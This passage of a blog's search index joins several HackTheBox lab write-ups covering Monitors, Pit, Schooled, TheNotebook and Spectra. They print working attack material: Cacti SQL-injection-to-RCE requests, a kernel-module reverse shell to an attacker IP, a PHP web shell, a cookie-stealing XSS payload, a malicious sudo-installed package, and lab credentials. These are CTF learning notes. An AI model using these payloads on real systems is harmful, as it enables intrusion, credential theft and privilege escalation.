&#39;DB_PASSWORD&#39;, &#39;BestAdministrator@2020!&#39; );In Apache on Ubuntu, all the virtual host configuration files are stored under /etc/apache2/sites-available directory. With the new Apache installation you can find a default virtual host file called 000-default.conf there.❯ curl -s &#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/apache2/sites-available/000-default.conf&#39;# Default virtual host settings# Add monitors.htb.conf# Add cacti-admin.monitors.htb.conf... [snip] ...found “virtual host” cacti-admin.monitors.htb.cacti SQLi Stacked Queries to RCEcacti is an open-source, web-based network monitoring and graphing tool designed as a front-end application for the open-source, industry-standard data logging tool RRDtool. Cacti allows a user to poll services at predetermined intervals and graph the resulting data.Running Version 1.2.12CVE-2020-14295: A SQL injection issue in color.php in Cacti 1.2.12 allows an admin to inject SQL via the filter parameter. This can lead to remote command execution because the product accepts stacked queries.Found Exploit: Cacti 1.2.12 - ‘filter’ SQL Injection / Remote Code Execution Here is the PoC: https://github.com/Cacti/cacti/issues/3622Login with wordpress user and dbpass: admin:BestAdministrator@2020!parameter filter in color.php in vulnerable for sql injection in export request.curl -s -X $&#39;GET&#39; \\ -b $&#39;Cacti=koa9gglffasaklp5bfefl82t6s; cross-site-cookie=bar&#39; \\ $&#39;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=1\\&#39;)+UNION+SELECT+1,version(),database(),4,5,6,7--+-&#39;PoC also tells that application accept stacked queries, which lead to remote code execution by replacing the path_php_binary setting inside the database.stacked queries: In SQL, a semicolon indicates that the end of a statement has been reached and what follows is a new one. This allows executing multiple statements in the same call to the database server; Source sqlinjection.netAnd path_php_binary is just a variable in cacti config file which stored php binary location. If we replace this value with any system command, it get executed by the server.Set value in path_php_binarycurl -s -X $&#39;GET&#39; \\ -b $&#39;Cacti=koa9gglffasaklp5bfefl82t6s; cross-site-cookie=bar&#39; \\ $&#39;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=1\\&#39;)+UNION+SELECT+1,2,3,4,5,6,7;update+settings+set+value=\\&#39;ping+-c+2+10.10.14.187;\\&#39;+where+name=\\&#39;path_php_binary\\&#39;;--+-&#39;Verify path_php_binary value.curl -s -X $&#39;GET&#39; \\ -b $&#39;Cacti=koa9gglffasaklp5bfefl82t6s; cross-site-cookie=bar&#39; \\ $&#39;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=1\\&#39;)+UNION+SELECT+1,name,value,4,5,6,7+from+settings+where+name=\\&#39;path_php_binary\\&#39;;--+-&#39;Then call host.php?action=reindex which get the shell_exec called with the path_php_binary.curl -s -X $&#39;GET&#39; \\ -b $&#39;Cacti=koa9gglffasaklp5bfefl82t6s; cross-site-cookie=bar&#39; \\ $&#39;http://cacti-admin.monitors.htb/cacti/host.php?action=reindex&#39;reverse shell with exploit script.PrivescSocat PortforwardingFound cacti config file /usr/share/cacti/cacti/include/config.php, which contains database creds cacti:cactipassViewing running processes, notice one thing, some systemd service running from user marcus(remote) www-data@monitors:/etc$ ps -aux | grep marcusroot 6000 0.0 0.0 60088 0 pts/5 S May29 0:00 su marcusmarcus 6001 0.0 0.1 76780 4976 ? Ss May29 0:00 /lib/systemd/systemd --usermarcus 6002 0.0 0.0 259044 4 ? S May29 0:00 (sd-pam)... [snip] ...found cacti-backup service usingand from backup file get user “marcus” passwordfrom user “marcus” found local service running on port “8443”LISTEN 0 128 127.0.0.1:8443 0.0.0.0:* find process running on port “8443”marcus@monitors:~$ ps -aux | grep 8443root 2095 0.0 0.0 628508 3912 ? Sl May30 0:08 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443socat already install on the box, use it to forward the port.marcus@monitors:~$ socat tcp-listen:8444,reuseaddr,fork tcp:localhost:8443port 8443 is running Apache Tomcat/9.0.31“ofbiz” Deserialization RCETomcat is running ofbiz found from gobusterApache OFBiz is an open source enterprise resource planning system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.Running version Apache OFBiz. Release 17.12.01Found List of Known VulnerabilitiesCVE-2021-30128: Apache OFBiz has unsafe deserialization prior to 17.12.07 version PoC by r0ckysec@github Online tool for java.lang.Runtime.exec() Payload require ysoserial Container with SYS_MODULE CapabilityThe container has SYS_MODULE capability. As a result, the container can insert/remove kernel modules in/from the kernel of the Docker host machine. linux capabilities, CAP_SYS_MODULE: This means that you can insert/remove kernel modules in/from the kernel of the host machine. abusing sys_module capability Exploit Scripts from hacktricks.xyz Orignal Post from blog.pentesteracademy.com ExploitWrite a program to invoke a reverse shell with the help of usermode Helper API.#include &amp;lt;linux/kmod.h&amp;gt;#include &amp;lt;linux/module.h&amp;gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;AttackDefense&quot;);MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);MODULE_VERSION(&quot;1.0&quot;);char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&quot;, NULL};static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };static int __init reverse_shell_init(void) {return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);}static void __exit reverse_shell_exit(void) {printk(KERN_INFO &quot;Exiting\\n&quot;);}module_init(reverse_shell_init);module_exit(reverse_shell_exit);Create a Makefile to compile the kernel module.obj-m +=reverse-shell.oall: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanRun makeStart reverse shell listenerExecute module insmod reverse-shell.ko" }, { "title": "Hackthebox - Pit", "url": "/posts/pit/", "categories": "hackthebox, linux", "tags": "snmp, seeddms 5.1.11, cve-2019-12744, acl, snmp extend", "date": "2021-05-28 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.241 pit.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: | 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)| 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)|_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)80/tcp open http nginx 1.14.1|_http-server-header: nginx/1.14.1|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)| snmp-info: | enterprise: net-snmp| engineIDFormat: unknown| engineIDData: 4ca7e41263c5985e00000000| snmpEngineBoots: 71|_ snmpEngineTime: 2m28s | snmp-sysdescr: Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64|_ System uptime: 2m28.24s (14824 timeticks)9090/tcp open ssl/zeus-admin?... [snip] ...| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.11 service unrecognized despite returning data. Port 9090: centOS login page(?) cookie header contains cockpit value. cockpit is a web-based graphical interface for servers, intended for everyone, especially those who are: new to Linux (including Windows admins) familiar with Linux and want an easy, graphical way to administer servers. hostname: dms-pit.htb from 9090 Port ssl certificate have 403 Forbidden Port 80: home is nginx default page.FootholdSNMP EnumerationSNMP(Simple Network Management Protocol) is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs…). SNMP Enumeration hacktricks.xyzMIB stands for Management Information Base and is a collection of information organized hierarchically. These are accessed using a protocol such as SNMP. There are two types of MIBs: scalar and tabular.Scalar objects define a single object instance whereas tabular objects define multiple related object instances grouped in MIB tables.OIDs stands for Object Identifiers. OIDs uniquely identify managed objects in a MIB hierarchy. This can be depicted as a tree, the levels of which are assigned by different organizations. Top level MIB object IDs (OIDs) belong to different standard organizations.More on hacktricks.xyzThere is a tool that convert these MIBs to human readable formatesudo apt install snmp-mibs-downloaderafter installed you can control them from sudo vim /etc/snmp/snmp.conf and adding comment on line mibs : to enable and remove comment to disable.SNMP Versions SNMP v1: Main one, it is still the most frequent, the authentication is based on a string (community string) that travels in plain-text (all the information travels in plain text). SNMP v2 and v2c: send the traffic in plain text also and uses a community string as authentication. SNMP v3: Uses a better authentication form and the information travels encrypted using (dictionary attack could be performed but would be much harder to find the correct creds that inn SNMPv1 and v2).Community StringsIn order to access the information saved on the MIB you need to know the community string on versions 1 and 2/2c and the credentials on version 3.The are 2 types of community strings: public mainly read only functions private Read/Write in generalWe can also bruteforce snmp Community Strings with onesixtyone❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.241Scanning 1 hosts, 3219 communities10.10.10.241 [public] Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_6410.10.10.241 [public] Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64Enumerating snmp with snmpwalk tool enable snmp-mibs-downloader to get output in readable format. First, install with sudo apt-get install snmp-mibs-downloader Now, edit the file /etc/snmp/snmp.conf and commenting out mibs : line. some important information from snmpwalk.netSnmpObjects: Extend snmp functionality with external scripts and command.❯ snmpwalk -v2c -c public 10.10.10.241 netSnmpObjectsNET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1NET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;monitoring&quot; = STRING: /usr/bin/monitorNET-SNMP-EXTEND-MIB::nsExtendArgs.&quot;monitoring&quot; = STRING: NET-SNMP-EXTEND-MIB::nsExtendInput.&quot;monitoring&quot; = STRING: NET-SNMP-EXTEND-MIB::nsExtendCacheTime.&quot;monitoring&quot; = INTEGER: 5NET-SNMP-EXTEND-MIB::nsExtendExecType.&quot;monitoring&quot; = INTEGER: exec(1)NET-SNMP-EXTEND-MIB::nsExtendRunType.&quot;monitoring&quot; = INTEGER: run-on-read(1)NET-SNMP-EXTEND-MIB::nsExtendStorage.&quot;monitoring&quot; = INTEGER: permanent(4)NET-SNMP-EXTEND-MIB::nsExtendStatus.&quot;monitoring&quot; = INTEGER: active(1)NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.&quot;monitoring&quot; = STRING: Memory usageNET-SNMP-EXTEND-MIB::nsExtendOutputFull.&quot;monitoring&quot; = STRING: Memory usage total used free shared buff/cache availableMem: 3.8Gi 499Mi 2.8Gi 80Mi 585Mi 3.0GiSwap: 1.9Gi 0B 1.9GiDatabase statusOK - Connection to database successful.System release infoCentOS Linux release 8.3.2011SELinux Settingsuser Labeling MLS/ MLS/ SELinux User Prefix MCS Level MCS Range SELinux Rolesguest_u user s0 s0 guest_rroot user s0 s0-s0:c0.c1023 staff_r sysadm_r system_r unconfined_rstaff_u user s0 s0-s0:c0.c1023 staff_r sysadm_r unconfined_rsysadm_u user s0 s0-s0:c0.c1023 sysadm_rsystem_u user s0 s0-s0:c0.c1023 system_r unconfined_runconfined_u user s0 s0-s0:c0.c1023 system_r unconfined_ruser_u user s0 s0 user_rxguest_u user s0 s0 xguest_rloginLogin Name SELinux User MLS/MCS Range Service**default** unconfined_u s0-s0:c0.c1023 *michelle user_u s0 *root unconfined_u s0-s0:c0.c1023 *# ... [snip] ...dskTable: Disk watching information. Partitions to be watched are configured by the snmpd.conf file of the agent.❯ snmpwalk -v2c -c public 10.10.10.241 dskTableUCD-SNMP-MIB::dskIndex.1 = INTEGER: 1UCD-SNMP-MIB::dskIndex.2 = INTEGER: 2UCD-SNMP-MIB::dskPath.1 = STRING: /UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddmsUCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-rootUCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddmsUCD-SNMP-MIB::dskMinimum.1 = INTEGER: 10000# ... [snip] ... found potential username: michelle Web directory: /seeddms51x/seeddms snmp extended command: /usr/bin/monitor OS: CentOS Linux release 8.3.2011 SELinux EnabledSeedDMS get SeedDMS login page from http://dms-pit.htb/seeddms51x/seeddms SeedDMS is a free document management system with an easy to use web based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 There is a authenticated RCE for SeedDMS versions 5.1.11 CVE-2019-12744: SeedDMS before 5.1.11 allows Remote Command Execution (RCE) because of un-validated file upload of PHP scripts ❯ searchsploit seeddms----------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path----------------------------------------------------------------------------------- ---------------------------------... [snip] ...SeedDMS versions &amp;lt; 5.1.11 - Remote Command Execution | php/webapps/47022.txt----------------------------------------------------------------------------------- --------------------------------- Don’t have version information. And it is a authenticated RCE, required login creds.Login Form Bruteforce with hydra Bruteforcing password for username found in SNMP Enumeration: michelle.using hydra to bruteforce password.&quot;&amp;lt;url&amp;gt;:&amp;lt;login-data&amp;gt;:&amp;lt;error&amp;gt;&quot;hydra -l michelle -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt dms-pit.htb http-post-form &quot;/seeddms51x/seeddms/op/op.Login.php:referuri=%2Fseeddms51x%2Fseeddms%2Fout%2Fout.ViewFolder.php%3Ffolderid%3D1&amp;amp;login=^USER^&amp;amp;pwd=^PASS^&amp;amp;lang=:Error signing in.&quot;SeedDMS RCESeedDMS versions &amp;lt; 5.1.11 - Remote Command Execution from ExploitDBFirst, find Michelle documents folderSecond, Upload php web shell&amp;lt;?phpif(isset($_REQUEST[&#39;cmd&#39;])){ echo &quot;&amp;lt;pre&amp;gt;&quot;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &quot;&amp;lt;/pre&amp;gt;&quot;; die;}?&amp;gt; find document ID Third, Go to http://dms-pit.htb/seeddms51x/seeddms/data/1048576/29/1.php?cmd=id to get the command response in browser. “data” and “1048576” are default folders where the uploaded files are get saved. any file name renamed to 1Reverse shell is not working Reason: SElinux; ippsec explainedAfter some enumeration from web shell, found database creds.❯ curl -s &#39;http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=cat+../../../conf/settings.xml|grep+dbPass|tail+-n1&#39;&amp;lt;pre&amp;gt; &amp;lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&amp;gt;&amp;lt;/pre&amp;gt;%Creds worked for cockpit server with username “michelle”.And get the user shell on host form cockpit terminal.PrivescAccess control list(ACL) While enumerating SNMP we found a script /usr/bin/monitor./usr/bin/monitor is a bash script that executing another bash script from /usr/local/monitoring, But user “michelle” don’t have permission to access this folder.But there is extra permission in this folder which identified by + in the end of the all permissions.This adds acl permissions to this direcotryACL(Access control list) provides an additional, more flexible permission mechanism for file systems. It is designed to assist with UNIX file permissions. ACL allows you to give permissions for any user or group to any disc resource. how acl works from geeksforgeeks.org ippsec explain in his videowe can use getfacl command to view ACL permissionsgetfacl -e /usr/local/monitoringlooking the acl permissions we can see that user “michelle” have #effective:-wx that means user “michelle” can write&amp;amp;execute but can’t read.SNMP Extend CommandSNMP executes /usr/bin/monitor script.❯ snmpwalk -v2c -c public 10.10.10.241 nsExtendCommandNET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;monitoring&quot; = STRING: /usr/bin/monitor nsExtendCommand stand for “full path of the command binary (or script) to run” and there is only one binary in this snmp. Net-SNMP agent provides a method to extend SNMP in Cumulus Linux via the NET-SNMP-EXTEND-MIB. using this MIB to query shell scripts specified by the extend directive in /etc/snmp/snmpd.conf.That script executes all/any script from /usr/local/monitoring directory with check*sh#!/bin/bashfor script in /usr/local/monitoring/check*shdo /bin/bash $scriptdoneWe can exploit this by create reverse shell script in /usr/local/monitoring/ and than execute it from snmp.First, create bash script in /usr/local/monitoring folderecho -e &#39;#!/bin/bash\\n\\necho &quot;ssh-rsa &amp;lt;public_key&amp;gt;&quot; &amp;gt; /root/.ssh/authorized_keys&#39; &amp;gt; /usr/local/monitoring/check-pwn.shSecond, execute snmp extend script /usr/bin/monitor with nsExtendObjects from NET-SNMP-EXTEND-MIB use MIB nsExtendObjects if direct OID is not work. And with that we don’t have to run complete snmpwalk and directly execute snmp extend scripts.snmpwalk -v2c -c public 10.10.10.241 1.3.6.1.4.1.8072.1.3.2Don’t know why but nothing else is working for me besides echoing ssh key Reason: SElinux; ippsec explained" }, { "title": "Hackthebox - Schooled", "url": "/posts/schooled/", "categories": "hackthebox, linux", "tags": "moodle lms 3.9.2, cve-2020-25627, cve-2020-14321, cve-2020-25629, sudo pkg", "date": "2021-05-26 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.234 schooled.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)| ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)| 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)|_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15|_http-title: Schooled - A new kind of educational institute33060/tcp open mysqlx?| fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message&quot;| HY000| LDAPBindReq: | *Parse error unserializing protobuf message&quot;| HY000| oracle-tns: | Invalid message-frame.&quot;|_ HY0001 service unrecognized despite returning data.Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd mysqlx is mysql + X Plugin musqlx overview blog Python module mysql-connector-python for intract with mysqlx: pip install mysql-connector-python X Plugin allows MySQL to function as a document store. X Plugin enables MySQL Server to communicate with clients using X Protocol, which is a prerequisite for using MySQL as a document store. Clients that communicate with a MySQL Server using X Protocol can use X DevAPI to develop applications. X DevAPI offers a modern programming(javascript, python) interface with a simple yet powerful design which provides support for established industry standard concepts. mysql port for X Protocol (mysqlx_port), supported by clients such as MySQL Shell, MySQL Connectors and MySQL Router, is calculated by multiplying the port used for classic MySQL protocol. if the classic MySQL protocol port is the default value of 3306 then the X Protocol port is 33060. http server is Running static web appffuf scan found a subdomain❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -H &#39;Host: FUZZ.schooled.htb&#39; -u http://schooled.htb/ -ac -c -v... [snip] ...________________________________________________[Status: 200, Size: 84, Words: 5, Lines: 2]| URL | http://schooled.htb/ * FUZZ: moodleFootholdMoodle LMS Enumerationmoodle.schooled.htb running a LMS(Learning Management System) ApplicationMoodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License.using droopescan tool to scan moodle cms❯ droopescan scan moodle -u http://moodle.schooled.htb/moodle/[+] Plugins found: forum http://moodle.schooled.htb/moodle/mod/forum/ http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt http://moodle.schooled.htb/moodle/mod/forum/version.php[+] No themes found.[+] Possible version(s): 3.10.0-beta[+] Possible interesting urls found: Static readme file. - http://moodle.schooled.htb/moodle/README.txt Admin panel - http://moodle.schooled.htb/moodle/login/Running version 3.10.0-beta(?)from login page http://moodle.schooled.htb/moodle/login/ get “create new account” option but when trying to create new account, get email address error.than create student account with email &amp;lt;username&amp;gt;@student.schooled.htbDon’t find anything interesting from student account.version identifingdroopescan found version 3.10.0-beta but if we compare /mod/forum/upgrade.txt changelogs with original v3.10.0-beta from github repo there is something missingRunning version on the sever is potentially &amp;gt;=3.9.0-beta to &amp;lt;=3.9.2we can cross check this by comparing md5sum hash from server and github’s upgrade.txt file.md5sum hash is equal with version 3.9.2 and upgrade.txt Latest commit d21d6ba on Oct 17, 2019 in version 3.9.0-beta and still same until 3.9.3vulnerabilityfound vulnerability list from snyk vulnerability databaseThere are 2 vulnerabilities looks interestingXSS: Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The moodlenetprofile user profile field required extra sanitizing to prevent a stored XSS risk.Privilege Escalation: Affected versions of this package are vulnerable to Privilege Escalation. Users with “Log in as” capability in a course context (typically, course managers) may gain access to some site administration capabilities by “logging in as” a System manager.XSS can be exploited from user and Privilege Escalation give access to admin panel from manager role and we already know the manager “Lianne Carter”.XSS in “Moodle”CVE-2020-25627: moodlenetprofile field in user profile is vulnerable for xss. which found http://moodle.schooled.htb/moodle/user/edit.php after creating student account.Payload&amp;lt;script&amp;gt;var i=new Image;i.src=&quot;http://10.10.15.71:8000/?&quot;+document.cookie;&amp;lt;/script&amp;gt;save payload in moodlenetprofile field and wait.this happened because xss payload saved in user profile and when other user visit to that user’s profile script executed on there browser.From mathematics Lecturer “Manuel Phillips” course Announcements http://moodle.schooled.htb/moodle/mod/forum/discuss.php?d=5: “For students who wish to attend my lectures be sure that you have your MoodleNet profile set.” when user enroll in his course, teacher review that student profile.So when “Manuel Phillips” visit our profile, xss payload get executed in his browser and we get his session cookie.Privilege Escalation in “Moodle”PoC from HoangKien1020@githubFrom teacher to manager roleCVE-2020-14321: Teachers of a course were able to assign themselves the manager role within that course.Hackbar is not working properly for me so i setup brup rule for replacing cookieAnd also, we can use cookie editor but knowing multiple solutions for a problem could be useful in some situation.First setup scope limited to schooled.htb host so brup only granted only scoped host request.than setup “match and replace” rule to replace cookie value.add same rule for both headersContinueWhen teacher “Manuel Phillips” add Participants in his course. There is a option to assign role for the Participant only inside that course. if we as “Manuel Phillips” intercept that request and change role id to 1, that Participant become a manager inside the course. That way we add “Manuel Phillips” in manager role inside the course by changing userID with roleID.First, Go to course Participants tab and enrol users.Second, Intercept enrolled request and replace userlist%5B%5D=24 and roletoassign=1 and forward the request.And “Manuel Phillips” got manager role.Third, Now we need to add original manager “Lianne Carter” in the Participants.Currently we are as manager role inside the course, that means we can login as any user from Participants list and if we add “Lianne Carter” in the Participants we can login as “Lianne Carter” and “Lianne Carter” have manager role over full website.So Assign user “Lianne Carter” in the courseAnd now going to “Lianne Carter” profile from course Participants as “Manuel Phillips”, we can see a new option “Log in as”Click login as and continueAnd we are logged in as “Lianne Carter”From manager to admin roleCVE-2020-25629: Users with “Log in as” capability in a course context (typically, course managers) may gain access to some site administration capabilities by “logging in as” a System manager.inside “Define roles” select manage and edit.inside “edit” click on “save changes” and intercept that request and replace post data with PoC’s payload and forward. Forget to take screenshot after that we can see extra option in “plugins”Moodle Admin RCEclick on “install plugins” than “Install plugin from ZIP file” and upload rce.zip get from PoCClick install than continue and after that go to http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=idplugin deletes after few minutePrivescAfter some manual enumeration found moodle directory and get the db creds from config.php filelogin to mysql and get “admin” password hash/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -D moodle -e &quot;SELECT username,password FROM mdl_user WHERE username=&#39;admin&#39;&quot;pkg with sudoThere are 2 users on the boxjamie:*:1001:1001:Jamie:/home/jamie:/bin/shsteve:*:1002:1002:User &amp;amp;:/home/steve:/bin/cshCracked hash worked for user “jamie” on ssh login.User “jamie” have sudo right to run /usr/sbin/pkg as any user on the box with NOPASSWD.jamie@Schooled:~ $ sudo -lUser jamie may run the following commands on Schooled: (ALL) NOPASSWD: /usr/sbin/pkg update (ALL) NOPASSWD: /usr/sbin/pkg install *user “jamie” can install any freebsd package with sudo.found exploit from gtfobins, *this is same as sudo snap on armageddon box.Create milicious package from fpm.COMMAND=&#39;chmod +s /bin/bash&#39;TF=$(mktemp -d)echo &quot;$COMMAND&quot; &amp;gt; $TF/x.shfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TFIf fpm is not installsudo gem install --no-document fpmsudo apt-get install squashfs-toolsupload package with scpsshpass -p &#39;!QAZ2wsx&#39; scp ./x-1.0.txz jamie@schooled.htb:/home/jamie/pkgAnd finally runsudo -u root /usr/sbin/pkg install -y --no-repo-update ./x-1.0.txz" }, { "title": "Hackthebox - TheNotebook", "url": "/posts/theNotebook/", "categories": "hackthebox, linux", "tags": "jwt bypass, docker runc, cve-2019-5736", "date": "2021-05-23 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.230 theNotebook.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open http nginx/1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelweb serverRegistering with new account and notice cookie.KID manipulationJSON Web Token) authentication cookieFootholdJWT bypass Useful tool: jwt_tool jwt-hack Resources PayloadsAllTheThings Online JWT Encoder – Decoder jsonwebtoken.io Online jwt generator jwtbuilder.jamiekurtz.comJWT authentication cookie is divided into three parts: header, payload, signature. These values divided by .JSON Web Token: Base64(Header).Base64(Data).Base64(Signature) Header: contain information about the JWT configuration. Data: used to store some users’ data. Signature: used to prevent data from being modified. The signature uses RS256 (RSA asymmetric encryption and private key signature) and HS256 (HMAC SHA256 symmetric encryption) algorithm.There are multiple ways to bypass Vickie Li show in her medium blogOn this box we are doing “KID manipulation” via “SSRF”KID: it allows to specify the key to be used for verifying the token.Creating tampered jwtHeader{ &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;kid&quot;: &quot;http://10.10.15.71/privKey.key&quot;}Data{ &quot;username&quot;: &quot;test12&quot;, &quot;email&quot;: &quot;test12@test.com&quot;, &quot;admin_cap&quot;: true}After creating jwt save its private key in a file and start web server.now changing the auth value in cookie parameter and replace with new generated jwt and forward the request. If everythings gose right we get admin panelthen using hackbar to load tampered cookieadmin panel have file upload option which allowed any file to upload reverse shell too.upload php reverse shell get file name execute the file and get shell on the box.Privescfound home directory backup in the /var/backups folder which contains noah user home folder.Breaking Docker via runCUser have sudo right to run docker exec as any user on the box with NOPASSWD.noah@thenotebook:~$ sudo -lMatching Defaults entries for noah on thenotebook: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser noah may run the following commands on thenotebook: (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*Docker version 18.06.0-ce, build 0ffa825searchsploit found exploit❯ searchsploit Docker 18.06------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------ ---------------------------------runc &amp;lt; 1.0-rc6 (Docker &amp;lt; 18.09.2) - Container Breakout (1) | linux/local/46359.mdrunc &amp;lt; 1.0-rc6 (Docker &amp;lt; 18.09.2) - Container Breakout (2) | linux/local/46369.md------------------------------------------------------------------------------------ ---------------------------------Also found the runc bianrynoah@thenotebook:~$ ls -la /usr/sbin/runc-rwxr-xr-x 1 root root 7841912 Feb 18 13:45 /usr/sbin/runcrunc version 1.0.0~rc6+dfsg1 CVE-2019-5736: runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe. PoC by Frichetten@github ExploitFirst get the inside container using sudo commandsudo -u root /usr/bin/docker exec -it webapp-dev01 /bin/bashUpload exploit zip inside the containerinside zip, modified bad_init.sh with command that you want to execute on the host in BAD_BINARY variable.run make scriptNow exit the container and execute /bin/bash in the same container 2 times.sudo -u root /usr/bin/docker exec -it webapp-dev01 /bin/bash" }, { "title": "Hackthebox - Spectra", "url": "/posts/spectra/", "categories": "hackthebox, linux", "tags": "wordpress admin, sudo initctl", "date": "2021-05-22 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.229 spectra.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.1 (protocol 2.0)| ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)80/tcp open http nginx 1.17.4|_http-server-header: nginx/1.17.4|_http-title: Site doesn&#39;t have a title (text/html).3306/tcp open mysql MySQL (unauthorized) webserver nginx 1.17.4 running 2 wordpress in different directories on the same host. http://spectra.htb/main/http://spectra.htb/testing/ Running wpscan on /main wordpress found - WordPress version 5.4.2 User: administrator/testing/ wordpress gives “Error establishing a database connection” which preventing to run wpcan.But it allows file indexing at /testing and from there found wp-config.phpGot dbcreds: devtest:devteam01 from /wp-config.php.saveTry connecting to mysql server return error.❯ mysql -h 10.10.10.223 -u devteam -pdevteam01ERROR 2002 (HY000): Can&#39;t connect to MySQL server on &#39;10.10.10.223&#39; (115)but Password worked on /main wordpress login with username administrator.Footholdwpadmin reverse shellEdit them and upload php reverse shell in the 404.php file and go to same theme 404.php file to execute reverse shellhttp://spectra.htb/main/wp-content/themes/twentytwenty/404.phpPrivescfound more dbcreds from /main wordpress config filenginx@spectra /usr/local/share/nginx/html/main $ cat wp-config.php | grep -i &#39;DB_USER\\|DB_PASSWORD&#39;define( &#39;DB_USER&#39;, &#39;dev&#39; );define( 